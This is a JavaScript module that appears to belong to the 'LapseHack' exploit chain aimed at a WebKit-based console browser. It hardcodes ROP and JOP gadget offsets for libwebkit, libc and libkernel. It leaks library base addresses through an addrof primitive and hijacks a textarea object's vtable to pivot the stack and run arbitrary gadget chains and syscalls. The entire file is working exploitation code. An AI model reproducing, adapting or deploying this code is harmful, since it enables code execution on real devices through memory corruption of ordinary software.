import { mem } from "/LapseHack/module/mem.mjs";
import { KB } from "/LapseHack/module/offset.mjs";
import { ChainBase } from "/LapseHack/module/chain.mjs";
import { BufferView } from "/LapseHack/module/rw.mjs";
import { get_view_vector, resolve_import, init_syscall_array } from "/LapseHack/module/memtools.mjs";
import * as off from "/LapseHack/module/offset.mjs";
const offset_wk_stack_chk_fail = 0x178;
const offset_wk_strlen = 0x198;
export let libwebkit_base = null;
export let libkernel_base = null;
export let libc_base = null;
const jop1 = `
mov rdi, qword ptr [rsi + 0x18]
mov rax, qword ptr [rdi]
call qword ptr [rax + 0xb8]
`;
const jop2 = `
pop rsi
jmp qword ptr [rax + 0x1c]
`;
const jop3 = `
mov rdi, qword ptr [rax + 8]
mov rax, qword ptr [rdi]
jmp qword ptr [rax + 0x30]
`;
const jop4 = `
push rbp
mov rbp, rsp
mov rax, qword ptr [rdi]
call qword ptr [rax + 0x58]
`;
const jop5 = `
mov rdx, qword ptr [rax + 0x18]
mov rax, qword ptr [rdi]
call qword ptr [rax + 0x10]
`;
const jop6 = `
push rdx
jmp qword ptr [rax]
`;
const jop7 = "pop rsp; ret";
const webkit_gadget_offsets = new Map(
    Object.entries({
        "pop rax; ret": 0x0000000000051a12,
        "pop rbx; ret": 0x00000000000be5d0,
        "pop rcx; ret": 0x00000000000657b7,
        "pop rdx; ret": 0x000000000000986c,
        "pop rbp; ret": 0x00000000000000b6,
        "pop rsi; ret": 0x000000000001f4d6,
        "pop rdi; ret": 0x0000000000319690,
        "pop rsp; ret": 0x000000000004e293,
        "pop r8; ret": 0x00000000001a7ef1,
        "pop r9; ret": 0x0000000000422571,
        "pop r10; ret": 0x0000000000e9e1d1,
        "pop r11; ret": 0x00000000012b1d51,
        "pop r12; ret": 0x000000000085ec71,
        "pop r13; ret": 0x00000000001da461,
        "pop r14; ret": 0x0000000000685d73,
        "pop r15; ret": 0x00000000006ab3aa,

        "ret": 0x0000000000000032,
        "leave; ret": 0x000000000008db5b,
        "mov rax, qword ptr [rax]; ret": 0x00000000000241cc,
        "mov qword ptr [rdi], rax; ret": 0x000000000000613b,
        "mov dword ptr [rdi], eax; ret": 0x000000000000613c,
        "mov dword ptr [rax], esi; ret": 0x00000000005c3482,

        [jop1]: 0x00000000004e62a4,
        [jop2]: 0x00000000021fce7e,
        [jop3]: 0x00000000019becb4,
        [jop4]: 0x0000000000683800,
        [jop5]: 0x0000000000303906,
        [jop6]: 0x00000000028bd332,
        [jop7]: 0x000000000004e293,
    }),
);

const libc_gadget_offsets = new Map(
    Object.entries({
        "getcontext": 0x24f04,
        "setcontext": 0x29448,
    }),
);

const libkernel_gadget_offsets = new Map(
    Object.entries({
        "__error": 0xcb80,
    }),
);

export const gadgets = new Map();
function get_bases() {
    const textarea = document.createElement("textarea");
    const webcore_textarea = mem.addrof(textarea).readp(off.jsta_impl);
    const textarea_vtable = webcore_textarea.readp(0);
    const off_ta_vt = 0x2e73c18;
    const libwebkit_base = textarea_vtable.sub(off_ta_vt);
    const stack_chk_fail_import = libwebkit_base.add(offset_wk_stack_chk_fail);
    const stack_chk_fail_addr = resolve_import(stack_chk_fail_import);
    const off_scf = 0x1ff60;
    const libkernel_base = stack_chk_fail_addr.sub(off_scf);
    const strlen_import = libwebkit_base.add(offset_wk_strlen);
    const strlen_addr = resolve_import(strlen_import);
    const off_strlen = 0x4fa40;
    const libc_base = strlen_addr.sub(off_strlen);
    return [libwebkit_base, libkernel_base, libc_base];
}
export function init_gadget_map(gadget_map, offset_map, base_addr) {
    for (const [insn, offset] of offset_map) {
        gadget_map.set(insn, base_addr.add(offset));
    }
}
class Chain900Base extends ChainBase {
    push_end() {
        this.push_gadget("leave; ret");
    }

    push_get_retval() {
        this.push_gadget("pop rdi; ret");
        this.push_value(this.retval_addr);
        this.push_gadget("mov qword ptr [rdi], rax; ret");
    }

    push_get_errno() {
        this.push_gadget("pop rdi; ret");
        this.push_value(this.errno_addr);
        this.push_call(this.get_gadget("__error"));
        this.push_gadget("mov rax, qword ptr [rax]; ret");
        this.push_gadget("mov dword ptr [rdi], eax; ret");
    }

    push_clear_errno() {
        this.push_call(this.get_gadget("__error"));
        this.push_gadget("pop rsi; ret");
        this.push_value(0);
        this.push_gadget("mov dword ptr [rax], esi; ret");
    }
}
export class Chain900 extends Chain900Base {
    constructor() {
        super();
        const textarea = document.createElement("textarea");
        this._textarea = textarea;
        const js_ta = mem.addrof(textarea);
        const webcore_ta = js_ta.readp(0x18);
        this._webcore_ta = webcore_ta;
        const vtable = new BufferView(0x200);
        const old_vtable_p = webcore_ta.readp(0);
        this._vtable = vtable;
        this._old_vtable_p = old_vtable_p;
        vtable.write64(0x1b8, this.get_gadget(jop1));
        vtable.write64(0xb8, this.get_gadget(jop2));
        vtable.write64(0x1c, this.get_gadget(jop3));
        const rax_ptrs = new BufferView(0x100);
        const rax_ptrs_p = get_view_vector(rax_ptrs);
        rax_ptrs.write64(0x30, this.get_gadget(jop4));
        rax_ptrs.write64(0x58, this.get_gadget(jop5));
        rax_ptrs.write64(0x10, this.get_gadget(jop6));
        rax_ptrs.write64(0, this.get_gadget(jop7));
        rax_ptrs.write64(0x18, this.stack_addr);
        const jop_buffer = new BufferView(8);
        const jop_buffer_p = get_view_vector(jop_buffer);
        jop_buffer.write64(0, rax_ptrs_p);
        vtable.write64(8, jop_buffer_p);
    }

    run() {
        this.check_allow_run();
        this._webcore_ta.write64(0, get_view_vector(this._vtable));
        this._textarea.scrollLeft;
        this._webcore_ta.write64(0, this._old_vtable_p);
        this.dirty();
    }
}

export const Chain = Chain900;
export function init(Chain) {
    const syscall_array = [];
    [libwebkit_base, libkernel_base, libc_base] = get_bases();
    init_gadget_map(gadgets, webkit_gadget_offsets, libwebkit_base);
    init_gadget_map(gadgets, libc_gadget_offsets, libc_base);
    init_gadget_map(gadgets, libkernel_gadget_offsets, libkernel_base);
    init_syscall_array(syscall_array, libkernel_base, 300 * KB);
    Chain.init_class(gadgets, syscall_array);
}